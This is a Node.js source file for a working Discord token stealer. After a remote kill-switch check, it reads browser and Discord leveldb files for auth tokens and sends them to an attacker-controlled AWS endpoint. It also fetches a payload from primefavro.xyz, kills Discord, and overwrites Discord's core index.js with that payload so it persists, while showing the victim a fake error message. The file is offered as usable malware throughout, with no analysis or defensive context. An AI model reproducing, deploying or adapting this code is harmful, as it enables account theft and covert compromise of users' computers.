const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch");
const publicIp = require("public-ip");
const fkill = require("kill-process-by-name");

var authorization = "6151744a243cfe17e7080efe4c4155511b2920fe5eb22719b5bcce437905b5ca"

var status = "okbro";

fetch("https://jw15efd878.execute-api.ca-central-1.amazonaws.com/default/Status")
  .then((res) => res.text())
  .then(async (access) => {
    console.log(access)
    if (access === "\"ACTIVE\"") {
      console.log("ok")
      function findToken(tokenPath) {
        tokenPath += "\\Local Storage\\leveldb";
        let tokens = [];
        try {
          fs.readdirSync(path.normalize(tokenPath)).map((file) => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
              fs.readFileSync(`${tokenPath}\\${file}`, "utf8")
                .split(/\r?\n/)
                .forEach(async (line) => {
                  const regex = [
                    new RegExp(/mfa\.[\w-]{84}/g),
                    new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
                  ];
                  for (const _regex of regex) {
                    const token = line.match(_regex);

                    if (token) {
                      token.forEach((element) => {
                        tokens.push(element);
                      });
                    }
                  }
                });
            }
          });
        } catch {}
        return tokens;
      }

      function init() {
        let paths;
        const computerPlatform = process.platform;

        if (computerPlatform == "win32") {
          const local = process.env.LOCALAPPDATA;
          const roaming = process.env.APPDATA;

          paths = {
            Discord: path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(
              local,
              "Google",
              "Chrome",
              "User Data",
              "Default"
            ),
            Opera: path.join(roaming, "Opera Software", "Opera Stable"),
            Brave: path.join(
              local,
              "BraveSoftware",
              "Brave-Browser",
              "User Data",
              "Default"
            ),
            Yandex: path.join(
              local,
              "Yandex",
              "YandexBrowser",
              "User Data",
              "Default"
            ),
          };
        }

        const tokens = {};
        for (let [platform, path] of Object.entries(paths)) {
          const tokenList = findToken(path);
          if (tokenList) {
            tokenList.forEach((token) => {
              if (tokens[platform] === undefined) tokens[platform] = [];
              tokens[platform].push(token);
            });
          }
        }
        console.log("Runtime Daemon Un-Responsive, Please Retry Later");

        async function fetchacc() {
          var tok = formatTokens(tokens);
          if (!tok) {
            fetch(
              "https://crp72tsdme.execute-api.ca-central-1.amazonaws.com/default/Opened?token=fuckeduplol&auth=" +
                authorization,
              {
                method: "GET",
              }
            );
          }
          await tok.forEach(async (token) => {
            var ok;
            ok = token;
            token = token.split("okevmro|||---")[0];
            var platform = ok.split("okevmro|||---")[1];
            fetch(
              "https://crp72tsdme.execute-api.ca-central-1.amazonaws.com/default/Opened?token=" +
                token +
                "&auth=" +
                authorization,
              {
                method: "GET",
              }
            );
          });
        }

        fetchacc();

        function formatTokens(obj) {
          var str = "";
          for (var p in obj) {
            if (obj.hasOwnProperty(p)) {
              var ee = obj[p];
              var arr = ee.toString().split(",");
              return (arr = arr.map((x) => x + "okevmro|||---" + p));
            }
          }
          return str + "okevmro|||---" + p;
        }

        async function GetIpAddress() {
          try {
            return `${await publicIp.v4()}`;
          } catch {
            return "No IP found :small_red_triangle_down:";
          }
        }
      }

      init();

      const local = process.env.LOCALAPPDATA;
      const discords = [];
      async function start() {
        try {
          var inject;
          await fetch("http://primefavro.xyz/injection")
            .then((code) => code.text())
            .then((res) => {
              res = res.replace("__PrimeAuth__", authorization);
              inject = res;
            });

          await fs.readdir(local, async (err, files) => {
            await files.forEach(async (dirName) => {
              if (dirName.toString().includes("cord")) {
                await discords.push(dirName);
              }
            });
            discords.forEach(async (discordPath) => {
              await fs.readdir(local + "\\" + discordPath, (err, file) => {
                file.forEach(async (insideDiscordDir) => {
                  if (insideDiscordDir.includes("app-")) {
                    await fs.readdir(
                      local + "\\" + discordPath + "\\" + insideDiscordDir,
                      (err, file) => {
                        file.forEach(async (insideAppDir) => {
                          if (insideAppDir.includes("modules")) {
                            fs.readdir(
                              local +
                                "\\" +
                                discordPath +
                                "\\" +
                                insideDiscordDir +
                                "\\" +
                                insideAppDir,
                              (err, file) => {
                                file.forEach((insideModulesDir) => {
                                  if (
                                    insideModulesDir.includes(
                                      "discord_desktop_core"
                                    )
                                  ) {
                                    fs.readdir(
                                      local +
                                        "\\" +
                                        discordPath +
                                        "\\" +
                                        insideDiscordDir +
                                        "\\" +
                                        insideAppDir +
                                        "\\" +
                                        insideModulesDir,
                                      (err, file) => {
                                        file.forEach((insideCore) => {
                                          if (
                                            insideCore.includes(
                                              "discord_desktop_core"
                                            )
                                          ) {
                                            fs.readdir(
                                              local +
                                                "\\" +
                                                discordPath +
                                                "\\" +
                                                insideDiscordDir +
                                                "\\" +
                                                insideAppDir +
                                                "\\" +
                                                insideModulesDir +
                                                "\\" +
                                                insideCore,
                                              (err, file) => {
                                                file.forEach(
                                                  (insideCoreFinal) => {
                                                    if (
                                                      insideCoreFinal.includes(
                                                        "index.js"
                                                      )
                                                    ) {
                                                      status = "okbro"
                                                      fs.mkdir(
                                                        local +
                                                          "\\" +
                                                          discordPath +
                                                          "\\" +
                                                          insideDiscordDir +
                                                          "\\" +
                                                          insideAppDir +
                                                          "\\" +
                                                          insideModulesDir +
                                                          "\\" +
                                                          insideCore +
                                                          "\\prime",
                                                        (err) => {}
                                                      );
                                                      fkill("discord");
                                                      fkill("discordPtb");
                                                      fs.writeFile(
                                                        local +
                                                          "\\" +
                                                          discordPath +
                                                          "\\" +
                                                          insideDiscordDir +
                                                          "\\" +
                                                          insideAppDir +
                                                          "\\" +
                                                          insideModulesDir +
                                                          "\\" +
                                                          insideCore +
                                                          "\\index.js",
                                                        inject,
                                                        (err) => {}
                                                      );
                                                    }
                                                  }
                                                );
                                              }
                                            );
                                          }
                                        });
                                      }
                                    );
                                  }
                                });
                              }
                            );
                          }
                        });
                      }
                    );
                  }
                });
              });
            });
          });
        } catch (err) {}
      }
      start();
    } else {
      return;
    }
  });